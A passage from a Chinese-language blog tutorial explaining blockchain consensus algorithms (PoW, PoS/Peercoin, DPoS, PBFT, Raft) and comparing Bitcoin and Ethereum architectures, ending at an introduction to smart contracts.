attack的有效方法为双重哈希算法，当然这种说法只是网上传言，没有得到具体确认。</li></ul></blockquote></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="BlockChain/13.jpg" alt></p><blockquote><ol><li><p>客户端产生新的交易，向全网广播</p></li><li><p>每个节点收到请求，将交易纳入区块</p></li><li><p>每个节点通过pow工作量证明</p></li><li><p>当某个节点找到了证明，向全网广播</p></li><li><p>当且仅当该区块的交易是有效的且在之前中未存在的，其他节点才认同该区块的有效性</p></li><li><p>接受该区块且在该区块的末尾制造新的区块</p></li></ol></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="BlockChain\14.jpg" alt></p><ol><li><p>节点总是认为最长的链是正确的链，并致力于在最长的链上进行扩展。</p></li><li><p>如果两个节点同时完成PoW过程并广播了不一样的区块，有的节点收到其中一个，而有的节点先会收到另一个。</p></li><li><p>这种情况下，首先收到的区块会被节点作为下一个区块添加到链上，同时也会保存后到的区块。</p></li><li><p>当下一个区块来临时，就会知道哪一个区块是比较长的，然后切换到较长的区块链上。</p></li></ol><ul><li>新交易的广播不一定要到达每一个节点，只要到达足够多的节点，这些节点就会在一定时间内将交易打包到区块中</li><li>区块的广播也是允许丢包的，如果节点没有收到某一个区块，当下一个区块到来时，该节点发现新区块的prevHash不是目前最后一个区块，就会去请求丢失的区块</li><li>因为做出工作量证明的节点上没有未建块的交易，从而有可能产生空块</li></ul><h4 id="POW的优缺点"><a href="#POW的优缺点" class="headerlink" title="POW的优缺点"></a>POW的优缺点</h4><ul><li><strong>优点：</strong>完全去中心化，节点自由进出</li><li><strong>缺点：</strong>目前bitcoin已经吸引了全球大部分的算力，其他再用POW共识机制的区块链应用很难获得相同算力来保障自身的安全；挖矿造成大量的资源浪费；共识达成的周期较长，不适合商业应用</li></ul><h3 id="POS"><a href="#POS" class="headerlink" title="POS"></a>POS</h3><p>POS：权益证明机制（Proof of Stake），是Pow的一种升级共识机制，根据每个节点所占代币的比例和时间，等比例的降低挖矿难度，从而加快找到随机数的速度。</p><p>若Pow主要比拼的是算力，那么Pos则是比拼余额。通俗说就是当手里的币越多，挖到一个块的概率越大</p><p>POS合格区块可以表述为：<code>F(Timestamp) = Target * Balance</code>，与POW的<code>F(Nonce) &lt; Target</code>  相比，式子左边的搜索空间由Nonce 变成 Timestamp，Nonce值域是无限的，而Timestamp的值域是极其有限的，一个合格的区块时间必须在前一个区块时间的规定范围之内，时间太早或者太超前的区块都不会被其他节点接纳。式子右边的目标值引入一个乘积因子余额，课件余额越大，整体目标值（Target*Balance）越大，越容易找到一个区块。因为Timestamp 有限，POS铸造区块成功率主要与Balance有关。</p><h4 id="Peercoin（PPC）"><a href="#Peercoin（PPC）" class="headerlink" title="Peercoin（PPC）"></a>Peercoin（PPC）</h4><p>PPC是POS的一种具体的实现方式</p><p>​        PPC是从中本聪所创造的BTC衍生出来的一种P2P的电子密码货币，以权益证明（Proof of Stake，以下简称PoS）取代工作量证明（Proof of Work，以下简称PoW）来维护网络安全。在这种混合设计中，PoW主要在最初的采矿阶段起作用。长远来看，PPC网络的安全并不依赖能源的消耗。因此PPC是一种节能而有成本优势的P2P电子密码货币。</p><p>​        PoS是基于币龄(coin age)并由通过与 BTC类似的由每个节点散列运算产生的，只是其搜索空间被限制了。区块链的历史及交易结算是通过一个中心化广播检查机制得到进一步保护。</p><p>​        要掌握Peercoin的POS机制，需要重点理解Sunny King专门为PPC设计的几个核心概念：</p><ul><li><h5 id="Coinage"><a href="#Coinage" class="headerlink" title="Coinage"></a>Coinage</h5><p>币龄，也叫币天。假如1.5个币存在于区块链中10天，币龄数值为：Coinage = 1.5 * 10 = 15</p><p>PPC采用币龄，而不是直接采用余额（Balance）来计算。一个UTXO(未花费的交易输出)一旦被花费，其币龄被清零，新的UTXO币龄从0开始算起</p></li></ul><ul><li><h5 id="stakeReward"><a href="#stakeReward" class="headerlink" title="stakeReward"></a>stakeReward</h5><p>权益激励，俗称获得利息，计算公式如下：<code>stakeReward = nCoinAge*33/(365*33+8)*0.01*COIN</code>，</p><p>公式可简化未：<code>stakeReward = (0.01 * nCoinAge /365) * COIN</code></p><p>其中，nCoinAge是CoinStake所有输入的币龄总和，由公式可知收益按1%年率计算。理想状态下，假设所有的币全年都参与挖矿，代币总量每年有1%通胀率，这一设计为很多人所诟病，而且，这一设计并不能激励矿工积极参与挖矿以维护区块链的安全，因为如果不考虑手续费，持币用户每隔几个月打开节点铸币，或者实时在线铸币，理论上收益都是一样的。</p></li></ul><ul><li><h5 id="stakeMinAge"><a href="#stakeMinAge" class="headerlink" title="stakeMinAge"></a>stakeMinAge</h5><p>POS系统也存在51%币龄攻击风险，为了增加攻击难度，Sunny King对每一笔UTXO的铸币资格做了最小年龄（stakeMinAge）限制：一个UTXO在区块链存在的时间小于stakeMinAge则没有铸币资格，PPC最小币龄为8小时。</p></li></ul><h4 id="POS2-0"><a href="#POS2-0" class="headerlink" title="POS2.0"></a>POS2.0</h4><p>黑币社区认为币龄可能会被恶意的节点滥用以获得更高的网络权重并成功实施<strong>双花攻击</strong>，于是发布POS2.0白皮书，对PPC做了几个细节优化，解决了一些潜在的安全问题，其中最重要的改进是用余额代替币龄，合格区块的条件由： </p><p><code>F(Timastamp) &lt; Target * 币数 * 币的年龄</code></p><p>变为：   <code>F(Timastamp) &lt; Target * 币数</code></p><p>如此一来，一笔UTXO无论放置多久其锻造区块的能力不变，此举可激励节点必须更多的保持在线进行铸币，提高系统安全性，将攻击途径减少到最低限度，并且能够显著提高网络保持运行的节点数量。</p><h4 id="POS3-0"><a href="#POS3-0" class="headerlink" title="POS3.0"></a>POS3.0</h4><p>黑币社区后来进一步升级，推出POS3.0版本，对交易手续费，难度调整做了一些优化，其中最显著的改变是将1%年利率奖励机制变为固定数额奖励（每个区块固定奖励1.5BLK），此举不但降低代币通胀率（考虑到会有代币永久丢失，低额奖励机制回归总量恒定的设计思路），同时意味着持币节点必须实时在线才能获得收益。</p><h4 id="POS的优缺点"><a href="#POS的优缺点" class="headerlink" title="POS的优缺点"></a>POS的优缺点</h4><ul><li>优点：在一定程度上缩短了共识达成的时间</li><li>缺点：还需要挖矿，本质上没有解决商业应用的痛点</li></ul><h3 id="DPoS"><a href="#DPoS" class="headerlink" title="DPoS"></a>DPoS</h3><p>DPOS：股份授权股份证明（Delegated Proof-Of-Stake）</p><blockquote><p><a href="https://blog.csdn.net/liankuaixy/article/details/79820710" target="_blank" rel="noopener">https://blog.csdn.net/liankuaixy/article/details/79820710</a></p></blockquote><p>比特股（Bitshares）项目于2013年8月开始启动，对区块链做了很多改造，并引入许多新概念和特征，尤其令人眼花缭乱的 Bitshares X、多态数字资产交易平台、资产锚定等新名词，一时令人无比兴奋而又困惑。此时POW和POS都已成功运行许久，彼此优劣已被反复讨论，两大阵营时至今日依然争论不休。按照项目规划，<strong>比特股对交易容量和区块速度有极高要求</strong>，显然POW或POS都达不到要求，于是比特股发明了一种新的共识机制DPOS，即股份授权股权证明。</p><p>DPOS是 PoS 的进化方案，在常规 PoW 和 PoS 中，一大影响效率之处在于任何一个新加入的 Block，都需要被整个网络所有节点做确认。</p><h5 id="DPoS-优化方案"><a href="#DPoS-优化方案" class="headerlink" title="DPoS 优化方案"></a>DPoS 优化方案</h5><p>​        <strong>通过不同的策略，不定时的选中一小群节点，这一小群节点做新区块的创建，验证，签名和相互监督，这样就大幅度的减少了区块创建和确认所需要消耗的时间和算力成本。</strong></p><h4 id="DPOS机制涉及的问题"><a href="#DPOS机制涉及的问题" class="headerlink" title="DPOS机制涉及的问题"></a>DPOS机制涉及的问题</h4><blockquote><p><strong>1. 持有股票</strong></p><p>   直接在交易平台上购买比特股即可</p><p><strong>2.  成为代表</strong></p><p>   成为一名代表，你必须在网络上注册你的公钥，分配到一个32位的特有标识符</p><p><strong>3.  授权选票</strong></p><p>   每个钱包有一个参数设置窗口，在该窗口里用户可以选择一个或更多的代表，并将其分级</p><p>   一般情况下，用户不会创建特别以投票为目的的交易，因为那将耗费他们一笔交易费</p><p><strong>4.  保持代表诚实</strong></p><p>   每个钱包将显示一个状态指示器，让用户知道他们的代表表现如何</p><p><strong>5.  抵抗攻击</strong></p><p>   在抵抗攻击上，因为前100名代表所获得的权利权是相同的，每名代表都有一份相等的投票权，并且，如果当前记账节点不记账则由下一个记账人记账，因此无法通过获得超过1%的选票而将权力集中到一个单一代表上，毕竟同时收买100给代表的难度很大。同时，每名代表的标识是其公钥而非IP地址，使得DOS攻击目标更为困难（难定位）</p><p><strong>6.  代表竞选</strong></p><p>   选出的代表拥有提出改变网络参数的特权，包括交易费用、区块大小、见证人费用和区块区间</p></blockquote><h4 id="DPOS遵循的基本原则"><a href="#DPOS遵循的基本原则" class="headerlink" title="DPOS遵循的基本原则"></a>DPOS遵循的基本原则</h4><ul><li>持股人依据所持股份行使表决权，而不是依赖挖矿竞争记账权</li><li>最大化持股人的盈利</li><li>最小化维护网络安全的费用</li><li>最大化网络的效能</li><li>最小化运行网络的成本（带宽、CPU等）</li></ul><h4 id="DPOS的优缺点"><a href="#DPOS的优缺点" class="headerlink" title="DPOS的优缺点"></a>DPOS的优缺点</h4><ul><li><h5 id="优点："><a href="#优点：" class="headerlink" title="优点："></a><strong>优点</strong>：</h5></li></ul><ol><li><p><strong>能耗更低</strong>：DPoS机制将节点数量进一步减少，在保证网络安全的前提下，整个网络的能耗进一步降低，网络运行成本最低。</p></li><li><p><strong>更快的确认速度</strong>：每个区块的时间为10秒，一笔交易（在得到6-10个确认后）大概1分钟，一个完整的区块的周期大概仅仅需要数分钟。而PoW机制下产生一个区块需要10分钟，一笔交易完成需要数个小时。</p></li><li>在一定程度上解决了拒绝服务攻击和潜在作恶节点联合作恶的问题。</li></ol><ul><li><h5 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a><strong>缺点</strong>：</h5></li></ul><ol><li><p><strong>投票的积极性并不高</strong>：绝大多数持股人从未参与投票。这是因为投票需要时间、精力以及技能，而这恰恰是大多数投资者所缺乏的。</p></li><li><p><strong>垄断性高</strong>：DPoS延续了PoS的弊端，只有持币者才可以获得区块链奖励，其实这就带来了一种制度性门槛，最终导致DPoS币的流动性大大减少，穷者越穷，富者越富。</p></li></ol><h3 id="PBFT"><a href="#PBFT" class="headerlink" title="PBFT"></a>PBFT</h3><p>PBFT：实用拜占庭容错算法（Practical Byzantine Fault Tolerance）</p><p>以往的区块链项目都以虚拟币为内核，而记录数据的应用不需要币机制模型。这个时候，Hyper Ledger（超级账本）应景而生，它是由Linux基金会组织牵头的项目，是一个旨在推动区块链数字技术和交易验证的开源项目。这个分布式账本技术是完全共享、透明和去中心化的，非常适合于金融行业的应用，以及其他的例如制造、银行、保险、物联网等无数个其他行业。</p><ul><li>PBFT是Hyper Ledger中使用的共识算法</li></ul><blockquote><p><a href="https://learnblockchain.cn/2019/08/29/pbft/" target="_blank" rel="noopener">https://learnblockchain.cn/2019/08/29/pbft/</a></p><p><a href="https://blog.csdn.net/jfkidear/article/details/81275974" target="_blank" rel="noopener">https://blog.csdn.net/jfkidear/article/details/81275974</a></p></blockquote><h4 id="PBFT的算法基本流程"><a href="#PBFT的算法基本流程" class="headerlink" title="PBFT的算法基本流程"></a>PBFT的算法基本流程</h4><p>假设有f个恶意节点，则保证系统正常运作，需要有2f+1个正常节点，总结点数为3f+1</p><ol><li>客户端发送请求给主节点</li><li>主节点广播请求给其他节点，节点执行pbft算法的三阶段共识流程</li><li>节点处理完三阶段流程后，返回消息给客户端</li><li>客户端收到来自f+1个节点相同消息后，代表共识已经正确完成</li></ol><p>如图：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="BlockChain/15.jpg" alt></p><p>C为Client，pre-prepare为预准备阶段，prepare为准备阶段，commit为提交阶段</p><blockquote><p>R在一个视图里，一个是主节点，其余的都叫做备份节点，如图主节点为0，即Client首先请求主节点负责将客户端的请求排好序，然后按序发给备份节点</p><p>但是主节点可能是拜占庭的：他可能会给不同的请求编上相同的序号，或者不去分配序号，后者让相邻序号不连续。</p><p>备份节点应当有职责主动检查这些序号的合法性，并能通过timeout机制检测到主节点是否已经宕机。</p><p>当出现异常情况下，就会出发视图更换view change协议来选举出新的主节点</p></blockquote><h5 id="Requset阶段"><a href="#Requset阶段" class="headerlink" title="Requset阶段"></a>Requset阶段</h5><p>在此阶段，客户端c向主节点p发送请求，&lt;Request，operation，timestamp，clientID&gt;</p><blockquote><p> operation：为请求具体操作</p><p> timestamp：请求时客户端追加的时间戳</p><p> clientID：客户端标识</p><p> Requset：包含消息内容message，以及信息摘要d(message)</p></blockquote><p>客户端对请求进行签名</p><h5 id="PBFT算法预备（Pre-Prepare）"><a href="#PBFT算法预备（Pre-Prepare）" class="headerlink" title="PBFT算法预备（Pre-Prepare）"></a>PBFT算法预备（Pre-Prepare）</h5><p>在预准备阶段，主节点对签名进行校验，并分配一个序列号n给收到的请求，然后向所有备份节点群发预准备消息，预准备消息的格式为：\&lt; &lt;Pre-Prepare，v，n，d&gt;  ， m &gt;</p><blockquote><p>v是视图编号</p><p>n是序列号</p><p>m是客户端发送的请求消息</p><p>d是请求消息m的摘要</p></blockquote><p><strong>预准备消息的目的是作为一种证明，确定该请求是在视图v中被赋予了序号n</strong></p><p>在视图变更的过程中可以追索请求</p><p>请求本身是不包含在预准备消息中，这样能使预准备消息足够小</p><h5 id="Prepare"><a href="#Prepare" class="headerlink" title="Prepare"></a>Prepare</h5><p>当节点收到pre-prepare消息后，会选择接收与否</p><p>满足下列条件时，各个备份节点才会接收一个预准备消息：①请求和预准备消息的签名正确，并且d与m的摘要一致；②当前视图编号是v；③该备份节点从未在视图v中接收过序号为n但是摘要d不同的消息m；④预准备消息的序号n必须在水线上下限h和H之间，水线存在的意义在于防止一个失效节点用一个很大的序号消耗序号空间。</p><p>如果备份节点i接受了预准备消息\&lt; &lt;Pre-Prepare，v，n，d&gt; ， m &gt;，则进入准备阶段。</p><p>在准备阶段的同时，该节点向所有副本节点发送准备消息 \&lt; Prepare，v，n，d，i &gt;，并且将预准备消息和准备消息写入自己的消息日志，可丢弃非法请求（即非法预准备消息）</p><p>节点（包括主节点）收到prepare消息后，进行验证prepare消息签名是否正确，视图编号是否一致，消息序号是否满足水线限制，若验证通过则将消息写入消息日志中。</p><p>副本节点i将（m，v，n，i）记入消息日志中，其中m是请求内容，预准备消息m在视图v中的编号n，以及2f个从不同副本节点收到的与预准备消息一致的准备消息</p><p>每个副本节点验证<strong>预准备和准备消息的一致性</strong>主要检查：视图编号v、消息序号n和摘要d</p><h5 id="Commit"><a href="#Commit" class="headerlink" title="Commit"></a>Commit</h5><p>当prepared (m,v,n,i)条件为真的时候，</p><ul><li><p>副本i生成确认消息</p></li><li><p>追加到本地消息日志文件</p></li><li><p>将确认消息向其他副本节点</p></li><li><p>广播进入了确认阶段  &lt; COMMIT，v，n，D(m)，i&gt;</p></li></ul><p>每个副本节点接收Commit消息的条件是：</p><ul><li>Commit消息签名正确</li><li>上一阶段请求的摘要也是D(m)</li><li>消息的视图编号与节点的当前视图编号一致</li><li>消息的序号n满足水线条件，在h和H之间</li></ul><p>一旦确认消息的接受条件满足了，则该副本节点将确认消息写入消息日志中</p><p>当节点收到2f+1（包括自身）个不同节点发送过来的Commit消息之后，进入Commit-local(m，v，n)状态，且所有序号小于n的请求都被处理，则执行客户端请求m中所要求的服务操作</p><p>保证在节点中提交的任意一个客户端请求，最终哦都会在另外2f个节点中被提交到本地的，并确保所有正常节点以同样顺序执行所有请求，这样就保证了算法的正确性</p><h5 id="Reply"><a href="#Reply" class="headerlink" title="Reply"></a>Reply</h5><p>同时将执行结果发送给客户端 \<reply ，v，t，c，i，r>，r为请求操作结果</reply></p><p>如果客户端收到f+1个相同的Reply消息，说明客户端发起的请求已经达到全网共识，否则客户端需要判断是否重新发送请求给主节点</p><p>副本节点会把时间戳比已回复时间戳更小的请求丢弃，以保证请求只会被执行一次</p><h4 id="PBFT-检查点-（checkpoint）"><a href="#PBFT-检查点-（checkpoint）" class="headerlink" title="PBFT 检查点 （checkpoint）"></a>PBFT 检查点 （checkpoint）</h4><blockquote><p>如何清除历史请求的记录消息？</p><p>在执行完多条请求K（例如：100条）后执行一次状态同步，即发送CheckPoint消息。&lt;CheckPoint, n, d, i&gt;，n是当前节点所保留的最后一个视图请求编号，d是对当前状态的一个摘要，该CheckPoint消息记录到log中。</p><p>如果副本节点i收到了2f+1个验证过的CheckPoint消息，则清除先前日志中的消息，并以n作为当前一个stable checkpoint。</p></blockquote><ul><li><p>stable checkpoint（稳定检查点）呢？</p><p> 大部分节点（2f+1）已经共识完成的最大请求序号。比如系统有4个节点，三个节点都已经共识完了的请求编号是213.那么这个213就是stable checkpoint</p></li></ul><p>实际上当副本节点i向其他节点发出CheckPoint消息后，其他节点有可能还没有完成K条请求，所以不会立即对i的请求作出响应，它还会按照自己的节奏，向前行进。此时发出的CheckPoint未能形成stable，为防止i的处理请求过快，设置一个高低水位区间[h, H]来解决这个问题， 低水位h等于上一个stable checkpoint编号，高水位H = h + L，其中L是我们指定的数值（如100，或200）， 当副本节点i处理请求超过高水位H时，就会停止脚步，等待stable checkpoint发生变化，再继续前进。</p><h4 id="算法视图变更"><a href="#算法视图变更" class="headerlink" title="算法视图变更"></a>算法视图变更</h4><p><strong>每个副节点维持一个计数器</strong>。备份节点在接收到一个有效请求，但是还没有执行它时，会查看计时器是否在运行，如果没有，那么它将启动计时器；当请求被执行时就把计时器停止。</p><p>如果计时器<strong>超时</strong>，将会把视图变更的消息向全网广播。在主节点失效的时候仍然保证系统的活性，防止备份节点<strong>无期限地等待请求的执行</strong>。需要确保在新的view中如何来延续上一个view最终的状态， 比如给这时来的新请求的编号，比如如何处理上一个view还没来得及完全处理好的请求</p><p><strong>计时器超时或发现作恶</strong>，副节点生成 view-change 消息 &lt;VIEW-CHANGE,v+1,n,C,P,i&gt;，最近一次的稳定检查点对应的请求的序列号 n，C 是证明该检查点稳定性的 2f+1 个 checkpoint 消息的集合，P 是 Pm 的集合，其中 m 是副节点 i 中的序列号大于 n 的等待提交和执行的客户端请求 m，每个 Pm 包含了如下的信息：①pre-prepare 消息；②2f 个由其他副节点签名的跟 pre-prepare 消息匹配的、有效的 prepare 消息；</p><p>此时，节点需要：</p><blockquote><p>记录到本地日志文件中；</p><p>同时广播给其他节点；</p><p>要求替换掉主节点，变更到下一个视图 v+1；</p></blockquote><ul><li>注意，在视图变更期间，除了 checkpoint、view-change 和 newview 消息之外，备份节点 i 是不会接受其他消息的</li></ul><p>在节点收到更换节点消息时，各个节点会收集视图变更信息，并发送确认给 view v+1 中的主节点。</p><p>（v+1 中的主节点可能是<strong>轮换</strong>产生，也可能<strong>选举</strong>产生）</p><p><strong>新的主节点</strong>接收到 2f 个有效的 view-change 消息之后，发送自己签名σp’ 的 new-view 消息&lt;NEW-VIEW, v+1, V, O&gt; ，V是主节点收到的2f+1个有效的VIEW-CHANGE消息 ，O是主节点重新发起的未经完成的PRE-PREPARE消息集合</p><ol><li><p>找到所有节点的共同的稳定检查点h。</p></li><li><p>在h和h+L之间，如果存在n消息，则创建&lt;&lt;PRE-PREPARE, v+1, n, d&gt;, m&gt;消息。否则创建一个空的PRE-PREPARE消息，即：&lt;&lt;PRE-PREPARE, v+1, n, d(null)&gt;, m(null)&gt;, m(null)空消息，d(null)空消息摘要。</p></li></ol><p>对于节点v+1，提议系统内所有节点切换到下一个视图 v+1，同时接受自己成为新的主节点</p><p><strong>副节点</strong>收到要求将视图变更为 v+1 的 new-vew 消息后，确认消息有效，接受该 new-view 消息，记录到本地消息文件中，同时将视图更换到新的视图v+1，副节点把 new-view 中携带的由新的主节点重新生成的 pre-prepare 消息追加记录到本地的消息日志中，按照检查点协议进行垃圾回收，删除比较老的消息</p><blockquote><p>对于 new-vew 消息中集合 O 中携带的所有由新主节点生成的新的 pre-prepare 消息，备份节点都会生成相应的 prepare 消息，记录到本地日志文件中，转发给其他节点，即对这些未处理的请求在新的视图中重新执行一遍三阶段协议，保证视图切换过程中未处理的请求能够重新被处理。</p></blockquote><ul><li><p>节点选出一个checkpoint作为新view处理请求的起始状态checkpoint就是当前节点处理的最新请求序号。</p></li><li><p>checkpoint就是当前节点处理的最新请求序号。 前文已经提到主节点收到请求是会给请求记录编号的。比如一个节点正在共识的一个请求编号是101，那么对于这个节点，它的checkpoint就是101</p></li><li><p>stable checkpoint（稳定检查点）呢？</p><p>大部分节点（2f+1）已经共识完成的最大请求序号。比如系统有4个节点，三个节点都已经共识完了的请求编号是213.那么这个213就是stable checkpoint。<strong>checkpoint的最大目的时减少内存占用。</strong></p><p>当检查点被证明是稳定后，节点会把本地消息日志中的消息中客户端请求序列号小于或者等于 n 的消息（pre-prepare、prepare、commit 消息）都删掉。同时，它会删掉旧的检查点和 checkpoint 消息。</p></li></ul><h3 id="RAFT"><a href="#RAFT" class="headerlink" title="RAFT"></a>RAFT</h3><p>RAFT最初是一个用于管理复制日志的共识算法，它是一个为真实世界应用建立的协议，主要注重协议的落地性和可理解性，RAFT是在非拜占庭故障下达成共识的强一致协议</p><p><strong>Raft算法包含三种角色，分别是：跟随者（follower），候选人（candidate）和领导者（leader）。一个节点在某一时刻只能是这三种状态的其中一种，这三种角色是可以随着时间和条件的变化而互相转换的。</strong></p><p>所有的节点初始状态都为follower，超时未收到心跳包的follower将变身candidate并广播投票请求，获得多数投票的节点将化身leader，这一轮投票的过程是谁先发出谁有利，每个节点只会给出一次投票，leader节点周期性给其他节点发送心跳包，leader节点失效将会引发新一轮的投票过程。</p><p>Raft阶段主要分为两个，首先是leader选举过程，然后在选举出来的leader基础上进行正常操作，比如日志复制、记账等。</p><ul><li>关于RAFT的较详细的动画，可访问 <a href="http://thesecretlivesofdata.com/raft/" target="_blank" rel="noopener">http://thesecretlivesofdata.com/raft/</a></li></ul><h4 id="选举流程"><a href="#选举流程" class="headerlink" title="选举流程"></a>选举流程</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RAFT的leader选举流程：  </span><br><span class="line"><span class="number">1</span>）任何一个服务器都可以成为一个候选者candidate，它向其他服务器follower发出要求选举自己的请求。</span><br><span class="line"><span class="number">2</span>）其他服务器同意了，发出OK。注意，如果在这个过程中，有一个follower宕机，没有收到请求选举的要求，此时候选者可以自己选自己，只要达到N/<span class="number">2</span>+<span class="number">1</span>的大多数票，候选人还是可以成为leader的。</span><br><span class="line"><span class="number">3</span>）这样这个候选者就成为了leader领导人，它可以向选民也就是follower发出指令，比如进行记账。</span><br><span class="line"><span class="number">4</span>）以后通过心跳进行记账的通知。</span><br><span class="line"><span class="number">5</span>）一旦这个leader崩溃了，那么follower中有一个成为候选者，并发出邀票选举。</span><br><span class="line"><span class="number">6</span>）follower同意后，其成为leader，继续承担记账等指导工作。</span><br></pre></td></tr></table></figure><h4 id="记账过程"><a href="#记账过程" class="headerlink" title="记账过程"></a>记账过程</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Raft的记账过程按以下步骤完成：</span><br><span class="line"><span class="number">1</span>）假设leader领导人已经选出，这时客户端发出增加一个日志的要求；</span><br><span class="line"><span class="number">2</span>）leader要求follower遵从他的指令，都将这个新的日志内容追加到他们各自日志中；</span><br><span class="line"><span class="number">3</span>）大多数follower服务器将交易记录写入账本后，确认追加成功，发出确认成功信息；</span><br><span class="line"><span class="number">4</span>）在下一个心跳中，leader会通知所有follower更新确认的项目。</span><br><span class="line">对于每个新的交易记录，重复上述过程</span><br></pre></td></tr></table></figure><h4 id="RAFT和PBFT对比"><a href="#RAFT和PBFT对比" class="headerlink" title="RAFT和PBFT对比"></a>RAFT和PBFT对比</h4><p>一个团队一定会有一个老大和普通成员。对于raft算法，共识过程就是：只要老大还没挂，老大说什么，我们（团队普通成员）就做什么，坚决执行。那什么时候重新老大呢？只有当老大挂了才重选老大，不然生是老大的人，死是老大的鬼。</p><p>对于pbft算法，共识过程就是：老大向我发送命令时，当我认为老大的命令是有问题时，我会拒绝执行。就算我认为老大的命令是对的，我还会问下团队的其它成员老大的命令是否是对的，只有大多数人（2f+1）都认为老大的命令是对的时候，我才会去执行命令。那什么时候重选老大呢？老大挂了当然要重选，如果大多数人都认为老大不称职或者有问题时，我们也会重新选择老大。</p><p>1.raft算法从节点不会拒绝主节点的请求，而pbft算法从节点在某些情况下会拒绝主节点的请求 ;</p><p>2.raft算法只能容错故障节点，并且最大容错节点数为（n-1）/2，而pbft算法能容错故障节点和作恶节点，最大容错节点数为（n-1）/3。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="BlockChain\16.jpg" alt></p><h2 id="区块链架构"><a href="#区块链架构" class="headerlink" title="区块链架构"></a>区块链架构</h2><h3 id="比特币"><a href="#比特币" class="headerlink" title="比特币"></a>比特币</h3><h4 id="区块链1-0"><a href="#区块链1-0" class="headerlink" title="区块链1.0"></a>区块链1.0</h4><p>区块链1.0是可编程货币，是与转账、汇款和数字化支付相关的密码学货币应用，目标是实现货币的去中心化与支付手段。比特币是区块链1.0最典型的代表, 区块链的发展催生了大量的货币交易平台，实现了货币的部分职能，能够实现货品交易。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="BlockChain/17.jpg" alt></p><blockquote><p>比特币钱包：</p><ul><li>移动钱包</li><li>桌面钱包</li><li>互联网钱包</li><li>纸钱包</li></ul></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="BlockChain\18.jpg" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="BlockChain\19.jpg" alt></p><h5 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h5><ul><li>利于并行</li><li>可回溯</li><li>避免数据膨胀</li></ul><h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5><ul><li>查余额时必须回溯查询一大堆交易信息，浪费大量时间和资源</li></ul><h3 id="以太坊"><a href="#以太坊" class="headerlink" title="以太坊"></a>以太坊</h3><h4 id="区块链2-0"><a href="#区块链2-0" class="headerlink" title="区块链2.0"></a>区块链2.0</h4><p>区块链2.0是可编程金融，是经济、市场和金融领域的区块链应用，核心理念是把区块链作为一个可编程的分布式信用基础设施，支撑智能合约应用，以与过去比特币区块链作为一个虚拟货币支撑平台区别开来。</p><p>以太坊：数字代币，基于智能合约</p><p><img src="https://magic-king.net/images/loading.gif" data-original="BlockChain/20.jpg" alt></p><p>以太坊架构如上</p><table><thead><tr><th></th><th>比特币</th><th>以太坊</th></tr></thead><tbody><tr><td>账户设计</td><td>无账户的概念，每个账户的余额都是从他们在区块链上的UTXO计算出来的</td><td>拥有外部账户和合约账户，外部账户为用户账户，由私钥控制。合约账户是一种可编程账户，受代码控制并由外部账户激活</td></tr><tr><td>区块链设计</td><td>采用Merkle树将交易的哈希值组成二叉树状结构，顶层节点的哈希值用来校验交易清单</td><td>采用Merkle Patricia树来实现对交易和状态的校验和查询。</td></tr><tr><td>计算和图灵完备</td><td>非图灵完备</td><td>图灵完备</td></tr><tr><td>EVM高级语言</td><td>不提供高级语言支持</td><td>提供Solidity、Serpent、LLL等高级语言让用户编写智能合约，高级语言会编译成在EVM中执行的EVM字节码</td></tr><tr><td>P2P网络</td><td>比特币P2P协议</td><td>创建引入RLPx与Whisper网络协议，RLPx协议主要功能是在节点间建立通信并维持通信；Whisper协议主要用于Dapp之间的通信。以太坊P2P网络实现了更多功能扩展</td></tr><tr><td>事件</td><td>无事件概念</td><td>以太坊中的事件是一个以太坊日志和事件监测的协议的抽象。日志的记录中提供合约的地址；事件利用现有的ABI功能来解析日志记录</td></tr><tr><td>共识机制</td><td>采用PoW机制，依靠的是CPU计算难度问题</td><td>对比特币PoW机制进行改进，加入内存难度，具有抵抗单凭哈希运算优化的ASIC挖矿机的属性，以太坊未来将采用PoS共识机制</td></tr></tbody></table><h5 id="以太坊客户端"><a href="#以太坊客户端" class="headerlink" title="以太坊客户端"></a>以太坊客户端</h5><p>较为流行的是go-Ethereum和Parity</p><p>两种账户类型：外部持有账户（EOA）和合约账户（CA）</p><p>外部账号可以调用合约账户</p><p>  以太坊中的世界状态定义为以太坊区块链中的全局状态，表示为以太坊地址和账户状态之间的映射。</p><p>u账户状态由4个字段组成:</p><ul><li><p><strong>nonce</strong>：当每次从地址发送交易时，该值递增。在合约账户中，该值代表账户创建的合约数量。</p></li><li><p><strong>balance:</strong>账户余额。ether也认为是以太币的单位，另一个常用的单位是wei。</p></li><li><p><strong>storageroot</strong>：代表Merkle Patricia树的根节点,并对账户的存储内容进行编码。（合约账户）</p></li><li><p><strong>codehash</strong>:作为一个不可变字段,包含了与账户关联的智能合约代码的哈希值。在普通账户中,该字段包含一个空字符串的 Keccak 256位哈希值。另外,代码通过一个消息调用而被调用。</p></li></ul><h2 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h2><p><strong>定义：</strong>广义的智能合约是一种<strong>安全的、处于运行状态的计算机程序</strong> ，体现了一种<strong>自动执行</strong>以及<strong>强制执行</strong>的协议。</p><p>狭义上讲，智能合约就是存储在区块链上的代码，用以实现执行特定的功能；能根据预先任意制定的规则来自动转移数字资产的系统。</p><p>智能合约有以下属性</p><ul><li>自动执行</li><li>强制执行</li><li>明确的语义</li><li>安全性和不可阻止性</li></ul><p>​        